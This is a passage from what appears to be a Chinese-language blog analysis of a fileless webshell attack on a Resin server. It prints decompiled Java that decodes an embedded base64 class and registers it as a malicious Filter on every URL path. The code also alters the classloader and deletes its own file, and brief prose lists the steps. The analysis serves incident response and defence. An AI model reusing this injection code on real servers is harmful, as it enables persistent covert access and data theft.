Thread.currentThread().getContextClassLoader();</span><br><span class="line">    final Class&lt;?&gt; loadClass &#x3D; contextClassLoader.loadClass(&quot;com.caucho.server.dispatch.ServletInvocation&quot;);</span><br><span class="line">    final Class&lt;?&gt; loadClass2 &#x3D; contextClassLoader.loadClass(&quot;com.caucho.server.dispatch.FilterConfigImpl&quot;);</span><br><span class="line">    final Class&lt;?&gt; loadClass3 &#x3D; contextClassLoader.loadClass(&quot;com.caucho.server.dispatch.FilterMapping&quot;);</span><br><span class="line">    final Class&lt;?&gt; loadClass4 &#x3D; contextClassLoader.loadClass(&quot;com.caucho.server.dispatch.FilterMapping$URLPattern&quot;);</span><br><span class="line">    final Class&lt;?&gt; loadClass5 &#x3D; contextClassLoader.loadClass(&quot;com.caucho.server.dispatch.FilterMapper&quot;);</span><br><span class="line">    final Object invoke &#x3D; loadClass.getMethod(&quot;getContextRequest&quot;, (Class&lt;?&gt;[])new Class[0]).invoke(loadClass, new Object[0]);</span><br><span class="line">    final Object invoke2 &#x3D; invoke.getClass().getMethod(&quot;getWebApp&quot;, (Class&lt;?&gt;[])new Class[0]).invoke(invoke, new Object[0]);</span><br><span class="line">    final String s5 &#x3D; &quot;com.caucho.filters.PseudodramaticallyFilter&quot;;</span><br><span class="line">    final String s6 &#x3D; &quot;yv66vgAAADIA2wgAVggAUgcAWggAjwcAGAEACVpLTTE1LjAuMAEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAlsb2FkQ2xhc3MKAFwAnwoANwCjAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWAQANU3RhY2tNYXBUYWJsZQEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsBAAFiAQAHZG9GaW5hbAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDAB6AHIMADIAcQEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyCgCSAEQHACMBAAlnZXRNZXRob2QBAAJbQgwApwBZAQAGZXF1YWxzCQAuAJUHAEABABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHABQKAAMAvgcAXwsAZwDOCgCbADgBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjCgADAK4MALsAvQkALgDRCgADAD4BABFqYXZhL2xhbmcvSW50ZWdlcgoAAwCRAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAoAjACxCgA5AJgBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgcATQcABwcAEwoAkgDAAQAGaW50ZXJuCwCCACUBAApTb3VyY2VGaWxlAQABWgoAmwCRBwB5DACpAIMHAEgKADcAeAEAJCgpTGphdmF4L3NlcnZsZXQvU2VydmxldElucHV0U3RyZWFtOwoAFgCuAQALbmV3SW5zdGFuY2UMAKkAjgwADwDIAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAB3ZhbHVlT2YBAAt0b0J5dGVBcnJheQEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgwASQDFAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmF4L2NyeXB0by9DaXBoZXIHABABABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAV3cml0ZQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEKEkpQwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQArY29tL2NhdWNoby9maWx0ZXJzL1BzZXVkb2RyYW1hdGljYWxseUZpbHRlcgEADmdldENsYXNzTG9hZGVyAQAEaW5pdAEABCgpW0MHANcBARUNcXp+cUIRGXVrYnBldxpxLyVXTngIZmAgA3VvcG0JbgR4N3N8SXJHUHhldFNvGXFafntRcxtgfGMYA3VvcDtSYsCAeDdTdFRzXyA9VXBEeQ1xawo8Z3xjOGZxDHptCg5xbVVwRHkNcWsDKFFKCw1xf3h7QlUFdWpiBTxAXzwtCjxnfGM4ZnEMem1zJHtjeHlLd0YhNyE1D0HAgHp9fmJUNidAOSAlCSZSNE54exEiUjRhJyEONihkaX1wcHMLX3BlOhIlWDorJzUPXSFAVF05B3rAgH98MVJCdQJ7MDFWT2QGeXw+LRE4WTotIyEXOFgnITFGRnAIZnA+IBQnRyYvAyhRShBediokcUZ0DHIpKHATJlt2DABYAEsBAAFJBwBGAQABdQoALgDWAQAGY2hhckF0AQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEAEGphdmEvbGFuZy9TdHJpbmcBAAdkZXN0cm95BwAdCwAcABkKAJMAhwEAIGphdmF4L3NlcnZsZXQvU2VydmxldElucHV0U3RyZWFtDABrAA0BACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwoAVQBkAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwATwCNAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwwAbwCoBwAqCwBnALIKAAMAdgEABChaKVYBAAlzdWJzdHJpbmcMALUAwgEACWdldEhlYWRlcgoAkgCdAQAEcmVhZAEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAxnZXRBdHRyaWJ1dGUBAA1zZXRBY2Nlc3NpYmxlAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAiQCABwB&#x2F;DAAXAKABAA9qYXZhL2xhbmcvQ2xhc3MBAAhnZXRDbGFzcwoALgCBAQALdG9DaGFyQXJyYXkMANQASgkAkwB9AQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEABCgpW0IMAIYArwcAQwEAAygpVgEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwA0ACtAQABYQwAQQBlAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24BAAhnZXRCeXRlcwEADmdldElucHV0U3RyZWFtBwDVBwCIAQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAUoW0MpVgEAJwN1b3A7S3cHczdSeUZlGlh2cHFCZBADdW9wO1JiwIB4N1N0VHNfIAwAPQC2DAAaAJwHAKYHACgKAAMAbAwADgA1AQAEQ29kZQcAtwwACABjCgA3AJALAGcAuQcARQEAFShMamF2YS9sYW5nL09iamVjdDspWgwAxACDAQARZ2V0RGVjbGFyZWRNZXRob2QMAMYAhAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsHAMwBAApFeGNlcHRpb25zDACeAKABAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWCgADAFMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQEACGRvRmlsdGVyAQAFKFtCKUkBAAY8aW5pdD4KAFUAhQwAdABqAQAIPGNsaW5pdD4BACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwwAqQAtAQAXKFtMamF2YS9sYW5nL09iamVjdDspW0IHAMMMAKkACwwAigA7CgA3ANMMAHMAYQEABmxlbmd0aAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UKAAMAEgwAzQC8AQAdUHNldWRvZHJhbWF0aWNhbGx5RmlsdGVyLmphdmEBAAxzZXRBdHRyaWJ1dGUBACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWDAB8AFAKAAMAYAwAQgCACgBVAD8BAAMoKUkBACBqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbgEABWNsb3NlAQAHKFtCSUkpVgEABmludm9rZQEAJihbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvQ2xhc3M7AQAGKFtCKVtCCgAgAGYBAAFjCgCSADgBAAJbQwEACmdldFNlc3Npb24MAG0ATAoAXACrAQALZ2V0SW5zdGFuY2UMAMoA1woAmwARDABOAHUBAARUWVBFAQATamF2YS9sYW5nL1Rocm93YWJsZQwADgDHAQATW0xqYXZhL2xhbmcvU3RyaW5nOwsAggC0BQAAQ3l6&#x2F;PKIACEALgCbAAEAHgADAAkAhgBUAAAACQAOADUAAAAaAMoA1wAAAAcAAQCpAIMAAQCWAAAAEQABAAEAAAAFKrcAIrEAAAAAAAIADgDHAAEAlgAAAKEABgAGAAAAeCtZAzLAAAVNVyq2ANK2ALNOLbIAJjoFGQUQDTK2ACwZBRAHMge9ADdZAxIDU1kEEgVTWQWyAH5TWQayAH5TtgAKOgQZBAS2AM8ZBC0HvQCbWQMBU1kELFNZBQO4AF5TWQYsvrgAXlO2AAnAADewTrsAjFkttwArvwABAAkAbQBuAIsAAQAMAAAADwAB&#x2F;wBuAAEHAC4AAQcAiwACAIYArwABAJYAAAEIAAYACQAAALMrWQMywAADTVcqtgDStgCzOgQZBLIAJjoIGQgQDjK2ACw6BRkEGQgGMrYALDoGGQUZCAgyA70AN7YAOhkFA70Am7YACToHGQYZCAMyBL0AN1kDEgNTtgA6GQcEvQCbWQMsU7YACcAABcAABU6nADs6BRkEsgAmOggZCAUytgAsOgYZBhkIBDIEvQA3WQMSA1O2ADoZBgS9AJtZAyxTtgAJwAAFwAAFTi2wTrsAjFkttwArvwACABIAbABvALAACQCoAKkAiwABAAwAAAAzAAP&#x2F;AG8ABQcALgAHAAMABwA5AAEHALD&#x2F;ADcABAcALgAABwAFAAD&#x2F;AAEAAQcALgABBwCLAAEATwCkAAIAlgAAAA0AAAACAAAAAbEAAAAAAKIAAAAEAAEAMAABAKcAcAACAJYAAAKQAAcAEgAAAWgUANk3BCvAAGc6B7IAGyzAAEc6CDYGGQeyACYHMrkAIQIAxgE5GQeyACYQCTK5ACECALIAJhAKMrYAKZkBIKcABL+7AJJZtwDLOgkZB7kAmgEAEgG5ANgCAMcAGxkHuQCaAQASAbIAJhAMMrkAMwMApwAEv7IAJjoRGREQCzK4AKo6ChkKBbsAFlkZB7kAmgEAEgG5ANgCAMAAA7YAaRkREAYytwA8tgBiGQe5AGgBADoLEQQAvAg6DBkLGQy2AMlZNg0CnwAbGQkZDAMVDbYAFRUGmgCDFQaZ&#x2F;+GnAAS&#x2F;uwADWRkJtgAxsgAmEAgytwAkOg4qGQ4EvQCbWl8DX1O3AHs6DyoZChkPtgDBBL0Am1pfA19TtwBXtgCZBb0Am1kDGQe5AJoBAFNZBBkIU7YANlcZCbYAbqcAHzoKLSssuQBdAwAZCbYAbqcADToQGQm2AG4ZEL8VBpkADy0rLLkAXQMApwAEv7EACADHANsA3gCLAEsAcABzAIsAFgA+AEEAiwBLATIBOgCLAEsBMgFMAAABOgFEAUwAAAFMAU4BTAAAAVYBYwFmAIsAAQAMAAAA1gAN&#x2F;wBBAAgHAC4HAHcHAJcHABwEAQcAZwcARwABBwCLAP8AMAAJBwAuBwB3BwCXBwAcBAEHAGcHAEcHAJIAAQcAiwD&#x2F;AEQAEQcALgcAdwcAlwcAHAQBBwBnBwBHBwCSBwBVBwAgBwAFAAAAAAcAUQAA&#x2F;wAkABEHAC4HAHcHAJcHABwEAQcAZwcARwcAkgcAVQcAIAcABQEAAAAHAFEAAQcAiwD&#x2F;AFoACQcALgcAdwcAlwcAHAQBBwBnBwBHBwCSAAEHAItRBwCL&#x2F;AAJBwCb+QAESgcAiwAAogAAAAYAAgAvADAAAQBbAIMAAQCWAAAADQAAAAEAAAABsQAAAAAACACsAIMAAQCWAAACngAIAAcAAAEdEA+9AAM6BQM+EgJZTbYAlDYEEAY8AjuEAAEsGlkbYLYAvwKnAGAZBV8dhAMBX1MaG2BZOxUEogAMLBq2AKU8p&#x2F;&#x2F;YEgRZTbYAlDYEEBU8AjuEAAEsGlkbYLYAvwOnACcZBV8dhAMBX1MaG2BZOxUEogAMLBq2AKU8p&#x2F;&#x2F;YGQWzACanAJxftgAfWb5fAzYGX1oEowBkWRUGXDQVBhAHcKoAAAAAAEUAAAAAAAAABQAAACcAAAAsAAAAMQAAADYAAAA7AAAAQBBppwAeEBSnABkQGacAFBARpwAPEBWnAAoQJ6cABRAWgpJVhAYBX1qaAAhcX6f&#x2F;pV9aFQaj&#x2F;5u7AANaX7cAJ7YAuF9XX6oAAP&#x2F;&#x2F;&#x2F;x0AAAAAAAAAAP&#x2F;&#x2F;&#x2F;1axAAAAAQAMAAABbwAT&#x2F;wAXAAYBAQcAAwEBBwBRAAD&#x2F;AA4ABwEBBwADAQEHAFEBAAEHAAMbDU4HAAMb&#x2F;wAHAAYBAQcAAwEBBwBRAAIHAAMB&#x2F;wAPAAcBAQcAAwEBBwBRAQADAQEHAKH&#x2F;AAIABwEBBwADAQEHAFEBAAUBAQcAoQcAoQH&#x2F;AC0ABwEBBwADAQEHAFEBAAYBAQcAoQcAoQEB&#x2F;wAEAAcBAQcAAwEBBwBRAQAGAQEHAKEHAKEBAf8ABAAHAQEHAAMBAQcAUQEABgEBBwChBwChAQH&#x2F;AAQABwEBBwADAQEHAFEBAAYBAQcAoQcAoQEB&#x2F;wAEAAcBAQcAAwEBBwBRAQAGAQEHAKEHAKEBAf8ABAAHAQEHAAMBAQcAUQEABgEBBwChBwChAQH&#x2F;AAQABwEBBwADAQEHAFEBAAYBAQcAoQcAoQEB&#x2F;wABAAcBAQcAAwEBBwBRAQAHAQEHAKEHAKEBAQH&#x2F;AA8ABwEBBwADAQEHAFEBAAMBAQcAoScAAQA0AAAAAgC6&quot;;</span><br><span class="line">    byte[] array3;</span><br><span class="line">    try &#123;</span><br><span class="line">        final Class&lt;?&gt; loadClass6 &#x3D; contextClassLoader.loadClass(&quot;java.util.Base64&quot;);</span><br><span class="line">        array3 &#x3D; (byte[])contextClassLoader.loadClass(&quot;java.util.Base64$Decoder&quot;).getMethod(&quot;decode&quot;, String.class).invoke(loadClass6.getMethod(&quot;getDecoder&quot;, (Class&lt;?&gt;[])new Class[0]).invoke(loadClass6, new Object[0]), s6);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (ClassNotFoundException ex4) &#123;</span><br><span class="line">        final Class&lt;?&gt; loadClass7 &#x3D; contextClassLoader.loadClass(&quot;javax.xml.bind.DatatypeConverter&quot;);</span><br><span class="line">        array3 &#x3D; (byte[])loadClass7.getMethod(&quot;parseBase64Binary&quot;, String.class).invoke(loadClass7, s6);</span><br><span class="line">    &#125;</span><br><span class="line">    final Method declaredMethod &#x3D; contextClassLoader.loadClass(&quot;java.lang.ClassLoader&quot;).getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, Integer.TYPE, Integer.TYPE);</span><br><span class="line">    declaredMethod.setAccessible(true);</span><br><span class="line">    final Class clazz &#x3D; (Class)declaredMethod.invoke(contextClassLoader, s5, array3, 0, array3.length);</span><br><span class="line">    final Object instance &#x3D; loadClass2.newInstance();</span><br><span class="line">    loadClass2.getMethod(&quot;setFilterName&quot;, String.class).invoke(instance, s5);</span><br><span class="line">    final Field declaredField &#x3D; loadClass2.getDeclaredField(&quot;_filterClassName&quot;);</span><br><span class="line">    declaredField.setAccessible(true);</span><br><span class="line">    declaredField.set(instance, s5);</span><br><span class="line">    final Field declaredField2 &#x3D; loadClass2.getDeclaredField(&quot;_filterClass&quot;);</span><br><span class="line">    declaredField2.setAccessible(true);</span><br><span class="line">    declaredField2.set(instance, clazz);</span><br><span class="line">    invoke2.getClass().getMethod(&quot;addFilter&quot;, loadClass2).invoke(invoke2, instance);</span><br><span class="line">    final Object instance2 &#x3D; loadClass3.newInstance();</span><br><span class="line">    loadClass4.getMethod(&quot;init&quot;, (Class&lt;?&gt;[])new Class[0]).invoke(loadClass4.getMethod(&quot;addText&quot;, String.class).invoke(loadClass3.getMethod(&quot;createUrlPattern&quot;, (Class&lt;?&gt;[])new Class[0]).invoke(instance2, new Object[0]), &quot;&#x2F;*&quot;), new Object[0]);</span><br><span class="line">    loadClass2.getMethod(&quot;setFilterName&quot;, String.class).invoke(instance2, s5);</span><br><span class="line">    declaredField.set(instance2, s5);</span><br><span class="line">    declaredField2.set(instance2, clazz);</span><br><span class="line">    loadClass3.getMethod(&quot;setServletContext&quot;, contextClassLoader.loadClass(&quot;javax.servlet.ServletContext&quot;)).invoke(instance2, invoke2);</span><br><span class="line">    Field field;</span><br><span class="line">    try &#123;</span><br><span class="line">        field &#x3D; invoke2.getClass().getDeclaredField(&quot;_filterMapper&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (NoSuchFieldException ex5) &#123;</span><br><span class="line">        field &#x3D; invoke2.getClass().getSuperclass().getDeclaredField(&quot;_filterMapper&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    field.setAccessible(true);</span><br><span class="line">    final Object value &#x3D; field.get(invoke2);</span><br><span class="line">    final Field declaredField3 &#x3D; loadClass5.getDeclaredField(&quot;_filterMap&quot;);</span><br><span class="line">    declaredField3.setAccessible(true);</span><br><span class="line">    final ArrayList list &#x3D; (ArrayList)declaredField3.get(value);</span><br><span class="line">    final ArrayList list2 &#x3D; new ArrayList&lt;Object&gt;(list.size() + 1);</span><br><span class="line">    list2.add(instance2);</span><br><span class="line">    int i &#x3D; 0;</span><br><span class="line">    try &#123;</span><br><span class="line">        while (i &lt; list.size()) &#123;</span><br><span class="line">            list2.add(list.get(i));</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (ClassNotFoundException ex) &#123;</span><br><span class="line">        throw ex;</span><br><span class="line">    &#125;</span><br><span class="line">    declaredField3.set(value, list2);</span><br><span class="line">    field.set(invoke2, value);</span><br><span class="line">    Field field2;</span><br><span class="line">    try &#123;</span><br><span class="line">        field2 &#x3D; invoke2.getClass().getDeclaredField(&quot;_loginFilterMapper&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    catch (NoSuchFieldException ex6) &#123;</span><br><span class="line">        field2 &#x3D; invoke2.getClass().getSuperclass().getDeclaredField(&quot;_loginFilterMapper&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    field2.setAccessible(true);</span><br><span class="line">    final Object value2 &#x3D; field2.get(invoke2);</span><br><span class="line">    final ArrayList list3 &#x3D; (ArrayList)declaredField3.get(value2);</span><br><span class="line">    final ArrayList list4 &#x3D; new ArrayList&lt;Object&gt;(list3.size() + 1);</span><br><span class="line">    list4.add(instance2);</span><br><span class="line">    int j &#x3D; 0;</span><br><span class="line">    try &#123;</span><br><span class="line">        while (j &lt; list3.size()) &#123;</span><br><span class="line">            list4.add(list3.get(j));</span><br><span class="line">            ++j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (ClassNotFoundException ex2) &#123;</span><br><span class="line">        throw ex2;</span><br><span class="line">    &#125;</span><br><span class="line">    declaredField3.set(value2, list4);</span><br><span class="line">    field2.set(invoke2, value2);</span><br><span class="line">    invoke2.getClass().getMethod(&quot;clearCache&quot;, (Class&lt;?&gt;[])new Class[0]).invoke(invoke2, new Object[0]);</span><br><span class="line">    try &#123;</span><br><span class="line">        final File file &#x3D; new File(System.getProperty(&quot;java.io.tmpdir&quot;));</span><br><span class="line">        final File file2 &#x3D; new File(file, s5.replace(&#39;.&#39;, &#39;&#x2F;&#39;) + &quot;.class&quot;);</span><br><span class="line">        Label_1596: &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                file2.getParentFile().mkdirs();</span><br><span class="line">                if (!file2.exists()) &#123;</span><br><span class="line">                    if (!file2.createNewFile()) &#123;</span><br><span class="line">                        break Label_1596;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            catch (ClassNotFoundException ex3) &#123;</span><br><span class="line">                throw ex3;</span><br><span class="line">            &#125;</span><br><span class="line">            final Constructor&lt;?&gt; declaredConstructor &#x3D; contextClassLoader.loadClass(&quot;sun.misc.URLClassPath$FileLoader&quot;).getDeclaredConstructor(URL.class);</span><br><span class="line">            declaredConstructor.setAccessible(true);</span><br><span class="line">            final Object instance3 &#x3D; declaredConstructor.newInstance(file.toURI().toURL());</span><br><span class="line">            ClassLoader classLoader;</span><br><span class="line">            for (classLoader &#x3D; ClassLoader.getSystemClassLoader(); classLoader.getParent() !&#x3D; null; classLoader &#x3D; classLoader.getParent()) &#123;&#125;</span><br><span class="line">            Field declaredField4 &#x3D; null;</span><br><span class="line">            Serializable s7 &#x3D; classLoader.getClass();</span><br><span class="line">            while (s7 !&#x3D; null) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    declaredField4 &#x3D; ((Class)s7).getDeclaredField(&quot;ucp&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                catch (NoSuchFieldException ex7) &#123;</span><br><span class="line">                    s7 &#x3D; ((Class&lt;? extends ClassLoader&gt;)s7).getSuperclass();</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            if (declaredField4 !&#x3D; null) &#123;</span><br><span class="line">                declaredField4.setAccessible(true);</span><br><span class="line">                final Field declaredField5 &#x3D; Field.class.getDeclaredField(&quot;modifiers&quot;);</span><br><span class="line">                declaredField5.setAccessible(true);</span><br><span class="line">                declaredField5.setInt(declaredField4, 0);</span><br><span class="line">                final Object value3 &#x3D; declaredField4.get(classLoader);</span><br><span class="line">                Field declaredField6 &#x3D; null;</span><br><span class="line">                Class&lt;?&gt; clazz2 &#x3D; value3.getClass();</span><br><span class="line">                while (clazz2 !&#x3D; null) &#123;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        declaredField6 &#x3D; clazz2.getDeclaredField(&quot;loaders&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    catch (NoSuchFieldException ex8) &#123;</span><br><span class="line">                        clazz2 &#x3D; clazz2.getSuperclass();</span><br><span class="line">                        continue;</span><br><span class="line">                    &#125;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if (declaredField6 !&#x3D; null) &#123;</span><br><span class="line">                    declaredField6.setAccessible(true);</span><br><span class="line">                    ((ArrayList)declaredField6.get(value3)).add(instance3);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Exception ex9) &#123;&#125;</span><br><span class="line">    final Object invoke3 &#x3D; invoke.getClass().getMethod(&quot;getInvocation&quot;, (Class&lt;?&gt;[])new Class[0]).invoke(invoke, new Object[0]);</span><br><span class="line">    new File((String)invoke.getClass().getSuperclass().getMethod(&quot;getRealPath&quot;, String.class).invoke(invoke, (String)invoke3.getClass().getMethod(&quot;getContextURI&quot;, (Class&lt;?&gt;[])new Class[0]).invoke(invoke3, new Object[0]))).delete();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Resin在com.caucho.server.webapp.WebApp实现了addFilter方法，因此可以通过反射调用该方法添加Filter。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/12.png" alt=""></p>
<p>实现Resin基于Filter无文件Webshell大致流程如下：<br>1.通过反射获取FilterConfigImpl类并实例化。<br>2.通过反射调用setFilterName设置Filter的名字，以及设置_filterClassName、_filterClass属性。<br>3.通过addFilter添加Filter到当前WebApp中。<br>4.实例化filterMapping并设置Filter作用的路由。<br>5.获取WebApp的_filterMapper和_loginFilterMapper，并将前面创建的filterMapping放置到所有filterMapping的首位。</p>
<p>看一下注册的Filter类，和之前不一样的是，Filter里面又多了一层加密，有点俄罗斯套娃的味道了。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/13.png" alt=""></p>
<p>再解密一次，得到最终的Filter类。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/Attack-Analysis-1/14.png" alt=""></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-前言"><span class="toc-number">1.</span> <span class="toc-text">0x1 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-攻击分析"><span class="toc-number">2.</span> <span class="toc-text">0x2 攻击分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-加密分析"><span class="toc-number">3.</span> <span class="toc-text">0x3 加密分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x4-无文件Webshell分析"><span class="toc-number">4.</span> <span class="toc-text">0x4 无文件Webshell分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x5-流量解密"><span class="toc-number">5.</span> <span class="toc-text">0x5 流量解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x6-冰蝎改造"><span class="toc-number">6.</span> <span class="toc-text">0x6 冰蝎改造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x7-新样本分析"><span class="toc-number">7.</span> <span class="toc-text">0x7 新样本分析</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/&text=记一次无文件Webshell攻击分析" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/&title=记一次无文件Webshell攻击分析" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/&is_video=false&description=记一次无文件Webshell攻击分析" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=记一次无文件Webshell攻击分析&body=Check out this article: http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/&title=记一次无文件Webshell攻击分析" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/&title=记一次无文件Webshell攻击分析" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/&title=记一次无文件Webshell攻击分析" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://changxia3.com/2021/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%97%A0%E6%96%87%E4%BB%B6Webshell%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/&title=记一次无文件Webshell攻击分析" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
